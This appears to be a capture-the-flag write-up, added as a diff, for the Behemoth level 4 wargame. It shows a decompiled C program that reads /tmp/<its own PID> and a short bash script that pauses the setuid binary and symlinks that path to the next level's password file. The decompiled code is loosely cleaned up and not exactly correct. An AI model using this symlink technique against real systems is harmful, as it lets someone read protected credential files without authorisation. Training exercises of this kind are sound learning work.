@@ -1,0 +1,58 @@
+behemoth4 was an interesting level... stressed me out a lot because I didn't understand what
+the purpose of the C file was. Turns out, it was really simple!
+
+
+Cleaned up and altered decompiled b4 main:
+------------------------------------------------------------
+int main(void)
+{
+    char    pidFile [4];
+    char    fileOut;
+    File*   fileP;
+    int     ppid;
+
+    ppid = getpid();
+    sprintf(pidFile, "/tmp/%d", ppid);
+    fileP = fopen(pidFile, 'r');
+    if (fileP == 0) {
+        puts("PID not found!");
+    } else {
+        sleep(1);
+        puts("Finished sleeping, fgetcing");
+        while( true ) {
+            fileOut = fgetc(fileP);
+            if (fileOut == -1) break;
+            putchar(fileOut);
+        }
+        fclose(fileP);
+    }
+    return 0;
+}
+------------------------------------------------------------
+
+As you can see, the behemoth4 program does essentially 2 things:
+ - Identify the PID of it's own process, and try to find a matching file '/tmp/PID'
+ - If it can open that file, it reads it until EOF
+
+This time around, I had the thought - I should be able to identify or control the PID in some way (turns out you can, and it is simple!)
+
+
+You can identify the most recently backgrounded process PID in bash with $!.
+As such, you just:
+ - execute behemoth 4 in the background
+ - stop it before it runs
+ - get the pid
+ - (most importantly) create a new symbolic link to b5's password file using that PID!
+ - continue the process for b4
+
+		    payload
+-----------------------------------------------
+#!/bin/bash
+/behemoth/behemoth4 &
+PID="$!"
+kill -STOP $PID
+ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
+kill -CONT $PID
+-----------------------------------------------
+
+Running this dumps out the credentials for behemoth5! Woo!
